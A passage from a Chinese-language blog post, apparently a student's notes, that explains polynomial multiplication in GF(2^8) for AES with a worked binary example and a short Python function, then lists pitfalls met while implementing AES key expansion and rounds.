class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>=</mo><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">=x^8+{x^7}+x^6+x^4+x^3+x+x^7+x^6+x^5+x^3+x^2+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>=</mo><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">=x^8+x^5+x^4+x^2+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>然后就是多项式乘法后相加，这里要注意，因为是在神秘的伽罗华域的模意义下，所以加实际上是进行抑或。两个相等的就直接干掉了。</p><p>然后我们实际上可以用二进制来模拟多项式的乘法，因为这些多项式都对应着一个个二进制，所以从大自然的规律上将也应该是可以的。</p><p>这里演示一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span></span></span></span>乘上<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>11101101</mn></mrow><annotation encoding="application/x-tex">11101101</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span></span></span></span>，也就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>乘上<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^7+x^6+x^5+x^3+x^2+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mtable rowspacing="0.15999999999999992em" columnalign="right" columnspacing="1em" rowlines="none solid none solid"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>11101101</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>×</mo><mspace width="3em"/><mn>11</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>11101101</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>11101101</mn><mtext> </mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>100110111</mn></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{r}11101101\\\times \hspace{3em} 11\\\hline11101101\\11101101\ \\\hline100110111\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.000000000000001em;vertical-align:-2.7500000000000004em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.25em;"><span class="pstrut" style="height:5.25em;"></span><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">×</span><span class="mspace" style="margin-right:3em;"></span><span class="mord">1</span><span class="mord">1</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mspace"> </span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span style="top:-3.6999999999999997em;"><span class="pstrut" style="height:5.25em;"></span><span class="hline" style="border-bottom-width:0.05em;"></span></span><span style="top:-6.1000000000000005em;"><span class="pstrut" style="height:5.25em;"></span><span class="hline" style="border-bottom-width:0.05em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span></span></span></span></span></p><p>得到的结果为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>100110111</mn></mrow><annotation encoding="application/x-tex">100110111</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span></span></span></span>，转化为多项式就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^8+x^5+x^4+x^2+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。和之前的结果一模一样。</p><p>需要注意的是，式子最后两个值相加的时候不会产生进位。而直接是按位抑或。我和老杜一开始因为写竖式习惯了进位，得到了错误的答案。</p><p>那能否用代码实现这个过程呢？我们注意这个竖式相抑或的两个值有所错位，把那个突出来的末尾补零后，其实是<code>11011010</code>和<code>1101101</code>两者按位抑或得到的结果。</p><p>在这个竖式里，被乘数是<code>11101101</code>，我们就不去动，去看乘数<code>11</code>，乘数<code>11</code>的最低位是<code>1</code>。故我们得到<code>11101101</code>。然后高位也是1，我们就把被乘数左移一位，得到<code>111011010</code>，然后两者再抑或即可得到结果。如果乘数更多的话，类似，从乘数的低位开始，根据位数的高低来进行不同的移位，并且根据那一个是0还是1决定是否参与到最后的抑或运算中。</p><p>在python中按位抑或一个专门的运算符，十分方便。</p><p><img src="https://upyun.wuuconix.link/image-20211008213115428.png" alt="^" /></p><p>以下是二进制乘法代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">poly1, poly2</span>):   <span class="hljs-comment"># 两个多项式相乘</span><br>result = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(poly2.bit_length()):<br><span class="hljs-keyword">if</span> poly2 &amp; (<span class="hljs-number">1</span> &lt;&lt; index):<br>result ^= (poly1 &lt;&lt; index)<br><span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><h2 id="aes实现中遇到的坑"><a class="markdownIt-Anchor" href="#aes实现中遇到的坑"></a> AES实现中遇到的坑</h2><p>遇到了一堆坑，下面根据我发现的时间顺序列举一下。</p><ol><li><p>ppt上说密钥生成那块的r，实际不是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>4</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{(i-1)/4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span></span>，前几轮是符合的，但是后几轮超过256后就不对了。</p><p><img src="https://upyun.wuuconix.link/image-20211008214506389.png" alt="r" /></p><p><img src="https://upyun.wuuconix.link/image-20211008214559750.png" alt="真实的r" /></p></li><li><p>最后一轮是不需要列混合的，ppt的图根本不对啊喂！</p><p><img src="https://upyun.wuuconix.link/image-20211008214216444.png" alt="虚假的ppt" /></p><p><img src="https://pic4.zhimg.com/v2-b22e3bdd7da5ddf5ea6ff71909dac4b7_r.jpg" alt="真实的流程" /></p></li><li><p>忘记初始xor密钥了，好吧这是我自己的锅。我之前还在想<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mn>0</mn></msub><msub><mi>w</mi><mn>1</mn></msub><msub><mi>w</mi><mn>2</mn></msub><msub><mi>w</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">w_0 w_1 w_2 w_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span 